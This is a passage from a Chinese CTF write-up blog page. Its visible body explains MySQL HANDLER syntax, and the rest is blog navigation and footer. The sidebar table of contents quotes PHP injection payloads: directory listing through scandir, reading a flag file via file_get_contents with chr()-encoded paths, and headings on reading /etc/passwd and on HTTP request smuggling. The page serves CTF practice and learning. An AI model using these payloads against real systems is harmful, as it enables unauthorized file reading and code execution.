+<p>打开一张表，无返回结果，实际上我们在这里声明了一个名为 tb1_name 的句柄。</p>
+<p>2、HANDLER tbl_name READ FIRST</p>
+<p>获取句柄的第一行，通过 READ NEXT 依次获取其它行。最后一行执行之后再执行 NEXT 会返回一个空的结果。</p>
+<p>3、HANDLER tbl_name CLOSE</p>
+<p>关闭打开的句柄。</p>
+<p>4、HANDLER tbl_name READ index_name = value</p>
+<p>通过索引列指定一个值，可以指定从哪一行开始，通过 NEXT 继续浏览。</p>
+
+      <div class="tags">
+          <a href="/tags/buuctf%EF%BC%8C%E6%97%A0%E5%AD%97%E7%AC%A6rce/" rel="tag"><i class="ic i-tag"></i> buuctf，无字符rce</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2025-05-08 20:20:16" itemprop="dateModified" datetime="2025-05-08T20:20:16+08:00">2025-05-08</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2024/04/28/3-txt/" title="buuctf4月27日">http://odiws.github.io/2024/04/28/3-txt/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/07/25/2019-Web-Unagi/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?245539" title="[CSAWQual2019]Web_Unagi">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>[CSAWQual2019]Web_Unagi</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#roarctf-2019easy-calc"><span class="toc-number">1.</span> <span class="toc-text"> [RoarCTF 2019]Easy Calc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E8%BF%99%E9%87%8C%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B91%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87-waf"><span class="toc-number">1.2.</span> <span class="toc-text"> 知识点 1：空格绕过 waf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payloadcalcphp-numvar_dumpscandircurrentlocaleconv"><span class="toc-number">1.2.1.</span> <span class="toc-text"> payload:calc.php? num&#x3D;var_dump(scandir(current(localeconv())));</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calcphp-numvar_dumpscandirchr46"><span class="toc-number">1.2.2.</span> <span class="toc-text"> calc.php? num&#x3D;var_dump(scandir(chr(46)));</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E7%90%86%E6%9F%A5%E7%9C%8B%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6calcphp-numvar_dumpscandirchr47"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 同理查看根目录下的文件：calc.php? num&#x3D;var_dump (scandir (chr (47)));</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#numfile_get_contentschr47chr102chr49chr97chr103chr103"><span class="toc-number">1.2.4.</span> <span class="toc-text"> num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B92file_get_contents-%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text"> 知识点 2.file_get_contents () 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B93url%E6%BA%A2%E5%87%BA"><span class="toc-number">1.4.</span> <span class="toc-text"> 知识点 3.url 溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-etcpasswd-%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 查看 &#x2F;etc&#x2F;passwd 文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B94http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">1.5.</span> <span class="toc-text"> 知识点 4.http 请求走私</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hctf-2018admin-1"><span class="toc-number">2.</span> <span class="toc-text"> [HCTF 2018]admin 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zjctf-2019nizhuansiwei"><span class="toc-number">3.</span> <span class="toc-text"> [ZJCTF 2019]NiZhuanSiWei</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#image-20240426180112007"><span class="toc-number">3.1.</span> <span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%85%88%E8%A6%81%E6%8A%8Awelcome-to-the-zjctf%E4%BB%8Etext%E4%B8%AD%E8%AF%BB%E5%87%BA%E6%9D%A5"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 1. 先要把 “welcome to the zjctf” 从 $text 中读出来</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020ez_bypass"><span class="toc-number">4.</span> <span class="toc-text"> [MRCTF2020]Ez_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84areuserialz"><span class="toc-number">5.</span> <span class="toc-text"> [网鼎杯 2020 青龙组] AreUSerialz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#protected%E6%9D%83%E9%99%90%E7%9A%84%E5%8F%98%E9%87%8F%E5%9C%A8%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%97%B6%E4%BC%9A%E6%9C%890000%E5%AD%97%E7%AC%A6"><span class="toc-number">5.0.1.</span> <span class="toc-text"> protected 权限的变量在序列化的时会有 %00*%00 字符，</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gxyctf2019babyupload"><span class="toc-number">6.</span> <span class="toc-text"> [GXYCTF2019]BabyUpload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#image-20240426201402591"><span class="toc-number">6.1.</span> <span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E8%A6%81%E6%94%B9content-typeimagejpeg%E6%98%AF%E5%9B%BE%E7%89%87%E7%9A%84%E6%A0%B7%E5%BC%8Fapplicationoctet-stream%E6%98%AFphp%E6%A0%B7%E5%BC%8F"><span class="toc-number">6.1.1.</span> <span class="toc-text"> 3. 要改 Content-Type:image&#x2F;jpeg 是图片的样式，application&#x2F;octet-stream 是 php 样式。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buuctf-gxyctf2019babysqli-1"><span class="toc-number">7.</span> <span class="toc-text"> BUUCTF [GXYCTF2019]BabySQli 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9handler%E8%AF%AD%E6%B3%95"><span class="toc-number">7.1.</span> <span class="toc-text"> 知识点：Handler 语法</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li class="active"><a href="/2024/04/28/3-txt/" rel="bookmark" title="buuctf4月27日">buuctf4月27日</a></li><li><a href="/2024/07/25/2019-Web-Unagi/" rel="bookmark" title="[CSAWQual2019]Web_Unagi">[CSAWQual2019]Web_Unagi</a></li><li><a href="/2024/07/28/2020-Greatphp/" rel="bookmark" title="[极客大挑战2020]Greatphp">[极客大挑战2020]Greatphp</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">19</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">6</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">16</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/04/28/3-txt/" title="buuctf4月27日">buuctf4月27日</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/GXYCTF2019-gakki/" title="[GXYCTF2019]gakki">[GXYCTF2019]gakki</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/07/28/2020-Greatphp/" title="[极客大挑战2020]Greatphp">[极客大挑战2020]Greatphp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/07/25/2019-Web-Unagi/" title="[CSAWQual2019]Web_Unagi">[CSAWQual2019]Web_Unagi</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/14/springboot-web/" title="springboot_web">springboot_web</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="java反序列化学习笔记">java反序列化学习笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/05/21/sqltest/" title="sqltest">sqltest</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5/" title="[SWPU2019]我有一只马里奥">[SWPU2019]我有一只马里奥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/06/17/ecshop%E5%A4%8D%E7%8E%B0/" title="ecshop复现">ecshop复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/23/Spring-MVC/" title="Spring_MVC">Spring_MVC</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/04/28/3-txt/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
